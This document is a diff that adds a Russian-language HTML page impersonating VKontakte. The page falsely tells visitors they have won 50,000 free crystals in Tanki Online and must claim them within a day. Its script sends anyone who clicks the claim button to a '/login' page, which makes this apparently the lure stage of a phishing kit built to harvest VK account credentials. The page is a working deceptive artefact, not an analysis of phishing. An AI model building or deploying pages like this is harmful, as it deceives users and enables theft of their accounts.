@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href=""><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                    <div class="container">
+                <img src="https://tankikit.info/files/02132321113011310123132203_15198281978.png" class="icon"></img>
+                <h1 class="title">Бонус <b>Tanki Online</b></h1>
+                <p class="subtitle">Вы получили 50.000 кристалов в игре Tanki Online беслатно, благодарим<br> 
+вас за то что стали участником игры Tanki Online, дальше лучше!<br>
+Данный бонус можно забрать в течении суток</p>
+                <button type="button" class="button"><span>Забрать бонус</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+                                                                    </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+                window.location.href = "/login";
+            }, 500);
+        });
+    </script>
+
+</body></html>
